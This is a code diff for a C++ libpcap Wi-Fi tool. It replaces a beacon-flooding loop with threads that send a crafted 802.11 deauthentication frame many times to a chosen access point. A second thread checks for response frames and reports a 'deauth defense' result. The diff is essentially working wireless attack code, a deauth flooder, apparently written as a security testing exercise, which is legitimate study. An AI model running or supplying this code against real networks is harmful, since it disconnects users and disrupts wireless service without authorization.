@@ -7,6 +7,7 @@
 #include <vector>
 #include <map>
 #include <unistd.h>
+#include <thread>
 
 
 void usage(){
@@ -15,8 +16,8 @@ void usage(){
     printf("sample: airodump wlan0\n");
 }
 
-
-
+void thread_scan(pcap_t* handle,bool *attack,bool *run,vector<uint8_t> sel);
+void thread_attack(pcap_t* handle,uint8_t *packet,uint8_t packet_size);
 
 
 int main(int argc, char *argv[])
@@ -158,25 +159,100 @@ int main(int argc, char *argv[])
 
                }
 
-
+/*
         uint8_t beacon1_size;
         uint8_t *beacon1=make_beacon(sel_mac,sel_ap,(uint8_t*)&beacon1_size,1);
+        uint8_t *beacon2=make_beacon(sel_mac,sel_ap,(uint8_t*)&beacon1_size,2);
+        uint8_t *beacon3=make_beacon(sel_mac,sel_ap,(uint8_t*)&beacon1_size,3);
 
+
+
+        while(1){
+         if (pcap_sendpacket(handle, beacon1, beacon1_size) != 0) printf("\nsend packet Error \n");
+         if (pcap_sendpacket(handle, beacon2, beacon1_size) != 0) printf("\nsend packet Error \n");
+         if (pcap_sendpacket(handle, beacon3, beacon1_size) != 0) printf("\nsend packet Error \n");
+         usleep(5000);
+
+           }*/
+
+
+        bool attack_defense=false;
+        bool scan_run=true;
         uint8_t deauth_size=0;
         uint8_t *deauth=make_deauth(sel_mac,(uint8_t*)&deauth_size);
 
-        for(int i=0;i<1000000;i++){
-         if (pcap_sendpacket(handle, beacon1, beacon1_size) != 0) printf("\nsend packet Error \n");
 
-         if(i%1000==0) {printf("send beacon,deauth packet %d\n", i);if (pcap_sendpacket(handle, deauth, deauth_size) != 0) printf("\nsend packet Error \n");}
-                 }
+
+        thread attack = thread(thread_attack,handle,deauth,deauth_size);
+        thread scan = thread(thread_scan,handle,&attack_defense,&scan_run,sel_mac);
+
+        attack.join();
+        if(!attack.joinable()) scan_run=false;
+        scan.join();
+
+        system("clear");
+        printf("------------------Select------------------\n");
+        printf("             ");
+        for(int j=0;j<5;j++) printf("%02x:",sel_mac[j]);
+        printf("%02x\n",sel_mac[5]);
+        printf("             ");
+        printf("ESSID:");
+        for(auto k=sel_ap.essid.begin();k<sel_ap.essid.end();k++) printf("%c",(*k));
+        printf("\n");
+
+        printf("------------------Result------------------\n");
+        printf("             ");
+        printf("deauth defense : %d\n",attack_defense);
+        printf("------------------------------------------\n");
+
 
 /*
-        for(int i=0;i<100;i++){
+         for(int i=0;i<1000000;i++){
+                     if(i%100==0) {
          if (pcap_sendpacket(handle, deauth, deauth_size) != 0) printf("\nsend packet Error \n");
          printf("send deauth packet %d\n", i);
-         sleep(1);
-                 }*/
-
+         usleep(5000);
+            }
+        }
+*/
 
 }
+
+void thread_scan(pcap_t* handle,bool *attack,bool *run,vector<uint8_t> sel){
+
+    uint8_t pk_cnt=0;
+    sleep(5);
+    printf("scan start\n");
+    while(*run){
+        printf("scanning\n");
+        struct pcap_pkthdr* header;
+        const u_char* packet;
+        int res = pcap_next_ex(handle,&header,&packet);
+        if(res ==0) continue;
+        if(res == -1 || res == -2) break;
+
+        struct radiotap *rd = (struct radiotap *) packet;
+        struct dot11_header *dot11 = (struct dot11_header *)(packet+rd->len);
+
+        uint8_t *target = dot11->dest;
+       bool is_continue=false;
+       for(int i=0;i<6;i++){
+           if(target[i]!=sel[i]) {is_continue=true;break;}}
+        if(is_continue)continue;
+        if((dot11->fc.type!=1) || (dot11->fc.subtype!=11)) continue;
+
+        if(++pk_cnt>5){*attack=true;break;}
+    }
+}
+
+void thread_attack(pcap_t* handle,uint8_t *packet,uint8_t packet_size){
+
+    for(int i=0;i<1000000;i++){
+             if(i%100==0) {
+                 if (pcap_sendpacket(handle, packet, packet_size) != 0) printf("\nsend packet Error \n");
+                 printf("send packet %d\n", i);
+                 usleep(5000);
+             }
+       }
+}
+
